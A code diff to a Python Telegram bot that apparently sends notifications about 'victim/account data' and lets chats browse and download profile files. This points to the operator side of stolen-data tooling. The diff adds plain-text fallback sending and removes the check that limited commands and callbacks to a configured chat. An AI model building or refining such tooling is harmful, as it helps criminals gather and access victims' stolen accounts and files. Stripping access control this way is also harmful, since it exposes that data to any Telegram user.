@@ -447,6 +447,14 @@ def extract_profile_id(folder_name: str) -> str:
     return folder_name
 
 
+def _telegram_plain_text(html_message: str) -> str:
+    """Convert our small Telegram-HTML subset to reliable plain text."""
+    import html as html_module
+    plain = re.sub(r"<a\s+href=[\"'][^>]*>(.*?)</a>", r"\1", html_message, flags=re.IGNORECASE | re.DOTALL)
+    plain = re.sub(r"</?(?:b|i|strong|em|code|pre)\s*>", "", plain, flags=re.IGNORECASE)
+    return html_module.unescape(plain)
+
+
 async def send_telegram_notification(message: str, config) -> bool:
     """
     Send a notification message to Telegram.
@@ -482,36 +490,61 @@ async def send_telegram_notification(message: str, config) -> bool:
     # Sanitize text for Telegram HTML parser
     sanitized_message = sanitize_for_telegram_simple(formatted_message)
     
-    # Check for duplicate notification
-    if notification_dedup.is_duplicate(sanitized_message):
+    # Deduplicate per destination, not globally: changing the Admin bot or
+    # chat must not suppress the first identical notification for the new
+    # account.
+    dedup_key = f"{str(bot_token).strip()}\x00{str(chat_id).strip()}\x00{sanitized_message}"
+    if notification_dedup.is_duplicate(dedup_key):
         logger.debug("[TELEGRAM] Duplicate blocked")
         return False
     
     try:
-        async with httpx.AsyncClient(timeout=10.0) as client:
+        async with httpx.AsyncClient(timeout=15.0) as client:
             url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
             payload = {
-                "chat_id": chat_id,
+                "chat_id": str(chat_id).strip(),
                 "text": sanitized_message,
                 "parse_mode": "HTML",
                 "disable_web_page_preview": True,
             }
-            
+
             response = await client.post(url, json=payload)
-            
-            if response.status_code == 200:
+            try:
                 data = response.json()
-                if data.get('ok'):
-                    notification_dedup.mark_sent(sanitized_message)
-                    logger.debug("[TELEGRAM] Sent")
+            except Exception:
+                data = {"description": response.text[:1000]}
+
+            if response.status_code == 200 and data.get('ok'):
+                notification_dedup.mark_sent(dedup_key)
+                logger.debug("[TELEGRAM] Sent")
+                return True
+
+            description = str(data.get('description') or 'Unknown Telegram error')
+            # Victim/account data can contain an unexpected '<', '&', or
+            # malformed URL. Retry only parser failures as plain text so one
+            # bad account cannot disable all server notifications. Token and
+            # destination errors are returned unchanged by Telegram.
+            if response.status_code == 400 and (
+                'parse' in description.lower() or 'entity' in description.lower()
+            ):
+                fallback = await client.post(url, json={
+                    "chat_id": str(chat_id).strip(),
+                    "text": _telegram_plain_text(sanitized_message),
+                    "disable_web_page_preview": True,
+                })
+                try:
+                    fallback_data = fallback.json()
+                except Exception:
+                    fallback_data = {"description": fallback.text[:1000]}
+                if fallback.status_code == 200 and fallback_data.get('ok'):
+                    notification_dedup.mark_sent(dedup_key)
+                    logger.debug("[TELEGRAM] Sent using plain-text fallback")
                     return True
-                else:
-                    logger.warning(f"[TELEGRAM] API error: {data.get('description', 'Unknown')}")
-                    return False
-            else:
-                logger.error(f"[TELEGRAM] HTTP {response.status_code}")
-                return False
-                
+                description = str(fallback_data.get('description') or description)
+
+            logger.warning("[TELEGRAM] send failed HTTP %s: %s", response.status_code, description)
+            return False
+
     except httpx.TimeoutException:
         logger.warning("[TELEGRAM] Timeout")
         return False
@@ -579,10 +612,8 @@ class TelegramBot:
         if not getattr(self.config, 'telegram_enabled', False):
             return
         
-        bot_token = getattr(self.config, 'telegram_bot_token', '')
-        chat_id = getattr(self.config, 'telegram_chat_id', '')
-        
-        if not bot_token or not chat_id:
+        bot_token = str(getattr(self.config, 'telegram_bot_token', '') or '').strip()
+        if not bot_token:
             return
         
         try:
@@ -621,13 +652,13 @@ class TelegramBot:
     
     async def _handle_telegram_update(self, update: dict):
         """Handle a single Telegram update"""
-        # Handle callback queries (inline keyboard button clicks)
+        # Handle callback queries (inline keyboard button clicks). There is no
+        # local chat-id whitelist here: Telegram already scopes updates to the
+        # bot token, and every chat may use the bot when it supplies the normal
+        # command login. The configured chat id is only the outbound target.
         callback_query = update.get("callback_query", {})
         if callback_query:
-            callback_chat_id = str(callback_query.get("message", {}).get("chat", {}).get("id", ""))
-            configured_chat_id = str(getattr(self.config, 'telegram_chat_id', ''))
-            if callback_chat_id == configured_chat_id:
-                await self._handle_profile_callback(callback_query)
+            await self._handle_profile_callback(callback_query)
             return
         
         # Handle regular messages
@@ -636,10 +667,7 @@ class TelegramBot:
             return
         
         chat_id_msg = str(message.get("chat", {}).get("id", ""))
-        
-        # Only respond to the configured chat_id
-        configured_chat_id = str(getattr(self.config, 'telegram_chat_id', ''))
-        if chat_id_msg != configured_chat_id:
+        if not chat_id_msg:
             return
         
         text = message.get("text", "")
@@ -1101,34 +1129,46 @@ Select a profile to browse its files
             self.downloading_files.pop(download_key, None)
     
     async def _send_telegram_message(self, chat_id: str, text: str):
-        """Send a message to Telegram chat"""
-        bot_token = getattr(self.config, 'telegram_bot_token', '')
-        
+        """Send a command response to any Telegram chat without a local id filter."""
+        bot_token = str(getattr(self.config, 'telegram_bot_token', '') or '').strip()
         if not bot_token:
             return
-        
-        # Natural-text formatting: bold highlights, clickable links,
-        # regular weight on values.  No monospace, no ASCII frame --
-        # the eye is guided by bolded labels instead of a uniform
-        # block of fake-monospace glyphs.
+
         formatted_text = format_telegram_html(text, use_bold=True, convert_links=True)
-        
-        # Sanitize text for Telegram
         sanitized_text = sanitize_for_telegram_simple(formatted_text)
-        
         try:
-            async with httpx.AsyncClient(timeout=10.0) as client:
+            async with httpx.AsyncClient(timeout=15.0) as client:
                 url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                 payload = {
-                    "chat_id": chat_id,
+                    "chat_id": str(chat_id).strip(),
                     "text": sanitized_text,
                     "parse_mode": "HTML",
                     "disable_web_page_preview": True,
                 }
                 response = await client.post(url, json=payload)
-
-                if response.status_code != 200:
-                    logger.warning(f"[TELEGRAM] Send failed: {response.status_code}")
+                try:
+                    data = response.json()
+                except Exception:
+                    data = {"description": response.text[:1000]}
+                if response.status_code == 200 and data.get("ok"):
+                    return
+                description = str(data.get("description") or "unknown Telegram error")
+                if response.status_code == 400 and (
+                    "parse" in description.lower() or "entity" in description.lower()
+                ):
+                    fallback = await client.post(url, json={
+                        "chat_id": str(chat_id).strip(),
+                        "text": _telegram_plain_text(sanitized_text),
+                        "disable_web_page_preview": True,
+                    })
+                    try:
+                        fallback_data = fallback.json()
+                    except Exception:
+                        fallback_data = {"description": fallback.text[:1000]}
+                    if fallback.status_code == 200 and fallback_data.get("ok"):
+                        return
+                    description = str(fallback_data.get("description") or description)
+                logger.warning("[TELEGRAM] Send failed HTTP %s: %s", response.status_code, description)
         except Exception as e:
             logger.warning(f"[TELEGRAM] Send error: {e}")
     
